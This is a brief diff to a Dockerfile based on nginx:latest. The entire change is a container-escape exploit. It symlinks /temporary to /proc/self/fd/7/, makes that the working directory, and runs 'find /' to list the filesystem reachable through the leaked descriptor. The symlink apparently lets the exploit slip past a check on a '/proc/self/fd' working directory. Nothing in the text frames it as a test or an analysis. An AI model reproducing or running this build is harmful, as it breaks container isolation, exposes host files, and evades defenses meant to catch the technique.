@@ -1,6 +1,8 @@
 FROM nginx:latest
 
-WORKDIR /proc/self/fd
+RUN ln -s /proc/self/fd/7/ /temporary
+
+WORKDIR /temporary
 RUN find /
 
 COPY . /usr/share/nginx/html
